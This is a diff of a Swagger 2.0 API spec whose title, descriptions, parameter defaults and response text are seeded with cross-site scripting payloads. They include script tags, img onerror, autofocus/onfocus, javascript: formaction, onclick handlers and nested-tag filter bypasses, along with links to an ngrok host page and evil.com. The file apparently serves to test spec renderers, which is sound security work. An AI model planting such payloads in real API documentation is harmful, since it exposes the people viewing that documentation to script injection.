@@ -1,10 +1,9 @@
 swagger: "2.0"
 info:
-  title: <<scr<script>script>alert(4)<</scr<script>/script><<img src=x onerror=alert(1)>
+  title: <img src=x onerror=alert(1)>
     
   version: "1.0.0"
   description: >
-    <<scr<script>script>alert(4)<</scr<script>/script>
     <a href="https://1c59-182-48-212-56.ngrok-free.app" target="_blank">Click</a>
     <a href="https://1c59-182-48-212-56.ngrok-free.app/Desktop/xss2.html" target="_blank">Click2</a>
     <a href="https://evil.com" target="_blank" rel="noopener noreferrer">Click me</a>
@@ -39,10 +38,10 @@ paths:
   /xss:
     get:
       summary: >
-        <<scr<script>script>alert(4)<</scr<script>/script>
+        <script>alert(4)</script>
       description: >
         <div style="background:red" onclick="alert('div XSS')">Click div</div>
-        <<scr<script>script>alert(4)<</scr<script>/script>
+        <script>alert(4)</script>
       parameters:
         - name: xssParam
           in: query
@@ -50,10 +49,10 @@ paths:
           type: string
           default: >
             <input autofocus onfocus="alert('XSS Input')">
-            <<scr<script>script>alert(4)<</scr<script>/script>
+            <script>alert(4)</script>
       responses:
         200:
           description: >
             <form><input type="submit" formaction="javascript:alert('XSS in Form')"></form>
-            <<scr<script>script>alert(4)<</scr<script>/script>
+            <script>alert(4)</script>
             <button onclick=alert(1)>XX</button>
